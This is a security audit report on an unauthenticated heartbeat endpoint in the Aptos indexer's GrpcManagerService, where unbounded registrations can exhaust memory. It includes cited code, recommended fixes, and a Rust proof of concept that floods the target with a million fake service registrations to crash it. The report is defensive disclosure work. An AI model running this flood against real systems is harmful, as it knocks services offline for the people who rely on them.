# Audit Report

## Title
Unbounded Service Registration Leading to Memory Exhaustion in GrpcManagerService

## Summary
The `GrpcManagerService` heartbeat endpoint lacks input validation and authentication, allowing an attacker to register unlimited fake services with arbitrary addresses and payloads, leading to memory exhaustion and service crash through uncontrolled growth of internal `DashMap` data structures.

## Finding Description

The `GrpcManagerService` created at line 92 in `grpc_manager.rs` exposes a `heartbeat` RPC endpoint that accepts `HeartbeatRequest` messages without any authentication or input sanitization. [1](#0-0) 

When a heartbeat request is received, the service extracts the `address` and `info` fields and passes them directly to `MetadataManager.handle_heartbeat()` without validation: [2](#0-1) 

The `handle_heartbeat()` function in `MetadataManager` processes different service types and stores them in unbounded `DashMap` structures: [3](#0-2) 

For each unique address, the system creates a new entry and stores up to 100 states (MAX_NUM_OF_STATES_TO_KEEP) in a `VecDeque`: [4](#0-3) 

**Attack Path:**
1. Attacker crafts malicious `HeartbeatRequest` messages with unique fake addresses
2. Each request contains `LiveDataServiceInfo` or `HistoricalDataServiceInfo` with large `active_streams` arrays (up to 256MB per message)
3. No authentication check prevents the attacker from sending these requests
4. Each unique address creates a new `DashMap` entry storing up to 100 states
5. The `DashMap` structures (`live_data_services`, `historical_data_services`) have no size limits: [5](#0-4) 
6. Memory grows unbounded as attacker floods with millions of fake service registrations
7. Eventually causes Out-of-Memory condition and service crash

The maximum message size is 256MB, allowing large payloads: [6](#0-5) 

No rate limiting or authentication mechanisms exist in the gRPC server setup: [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program's "API crashes" category. An attacker can remotely crash the indexer-grpc-manager service through memory exhaustion, causing:

- **Service Unavailability**: The indexer API becomes unresponsive, preventing applications from querying blockchain data
- **API Crashes**: Out-of-Memory condition forces service termination
- **Infrastructure Disruption**: Dependent services and applications lose access to indexed blockchain data

While this doesn't directly affect consensus or validator operations, it impacts critical infrastructure that applications depend on for blockchain data access.

## Likelihood Explanation

**Likelihood: High**

- **No Authentication Required**: Any network peer can send gRPC requests to the exposed endpoint
- **No Rate Limiting**: Attacker can flood the service without throttling
- **Low Attacker Sophistication**: Crafting protobuf messages is trivial with standard gRPC tools
- **Remote Exploitation**: Attack can be launched from anywhere on the network
- **Immediate Impact**: Memory exhaustion occurs relatively quickly with sustained attack

The attack requires only basic knowledge of gRPC and the ability to send network requests, making it highly feasible for any motivated attacker.

## Recommendation

Implement the following security controls:

1. **Add Authentication**: Require authentication tokens for heartbeat requests, validating that only legitimate data services can register
2. **Implement Service Allowlist**: Maintain a configuration-based allowlist of valid service addresses and reject unknown addresses
3. **Add Rate Limiting**: Implement per-IP rate limiting on the heartbeat endpoint
4. **Add Service Registration Limits**: Cap the maximum number of services that can register
5. **Validate Input Sizes**: Enforce limits on `active_streams` array size and other nested structures
6. **Add Monitoring**: Implement alerts for unusual registration patterns

Example fix for address validation:
```rust
// In metadata_manager.rs, add validation in handle_heartbeat():
pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
    // Validate address is in allowlist
    if !self.is_allowed_address(&address) {
        bail!("Address not in allowlist: {}", address);
    }
    
    // Check registration limit
    let total_services = self.live_data_services.len() 
        + self.historical_data_services.len()
        + self.fullnodes.len();
    if total_services >= MAX_REGISTERED_SERVICES {
        bail!("Maximum service registration limit reached");
    }
    
    // Validate data size
    self.validate_info_size(&info)?;
    
    match info {
        // ... existing match logic
    }
}
```

## Proof of Concept

```rust
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest,
    LiveDataServiceInfo,
    ServiceInfo,
    StreamInfo,
    ActiveStream,
};
use tonic::transport::Channel;

#[tokio::test]
async fn test_memory_exhaustion_attack() {
    // Connect to target GrpcManager
    let channel = Channel::from_static("http://[target]:50051")
        .connect()
        .await
        .unwrap();
    let mut client = GrpcManagerClient::new(channel);
    
    // Flood with fake service registrations
    for i in 0..1_000_000 {
        let fake_address = format!("http://attacker-fake-service-{}.com:50051", i);
        
        // Create large active_streams array to maximize memory consumption
        let active_streams = (0..1000)
            .map(|j| ActiveStream {
                id: format!("stream-{}-{}", i, j),
                start_time: Some(Default::default()),
                start_version: 0,
                end_version: None,
                progress: None,
            })
            .collect();
        
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(fake_address),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(Default::default()),
                    known_latest_version: Some(1000000),
                    stream_info: Some(StreamInfo { active_streams }),
                    min_servable_version: Some(0),
                })),
            }),
        };
        
        // Send heartbeat - no authentication required
        let _ = client.heartbeat(request).await;
        
        if i % 10000 == 0 {
            println!("Sent {} fake registrations", i);
        }
    }
    
    // Service will crash with OOM before loop completes
    println!("Attack completed - target service should be crashed");
}
```

## Notes

This vulnerability specifically affects the indexer-grpc-manager component, which is auxiliary infrastructure for serving blockchain data queries. While it doesn't directly impact consensus, execution, or validator operations, it does affect availability of critical indexer infrastructure that applications depend on. The lack of basic security controls (authentication, rate limiting, input validation) on a network-facing service represents a significant security gap.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-105)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L127-137)
```rust
pub(crate) struct MetadataManager {
    chain_id: u64,
    self_advertised_address: GrpcAddress,
    grpc_managers: DashMap<GrpcAddress, Peer>,
    fullnodes: DashMap<GrpcAddress, Fullnode>,
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
    historical_data_services: DashMap<GrpcAddress, HistoricalDataService>,
    known_latest_version: AtomicU64,
    // NOTE: We assume the master is statically configured for now.
    master_address: Mutex<Option<GrpcAddress>>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```
